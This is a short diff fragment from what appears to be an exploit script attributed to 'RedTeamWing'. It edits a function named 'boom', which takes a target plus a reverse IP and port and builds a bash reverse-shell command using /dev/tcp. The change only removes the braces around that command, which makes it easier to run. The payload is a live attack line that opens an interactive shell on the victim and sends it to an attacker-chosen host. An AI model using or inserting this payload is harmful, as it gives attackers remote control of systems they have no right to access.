@@ -20,7 +20,7 @@ github@RedTeamWing
 
 def boom(target,version,reverseip,reverseport):
     target = target
-    command = "{sh -i >& /dev/tcp/" + reverseip+ "/" + reverseport +  " 0>&1}"
+    command = "sh -i >& /dev/tcp/" + reverseip+ "/" + reverseport +  " 0>&1"
     print("[+]reverse shell command:",command)
     version = version
 
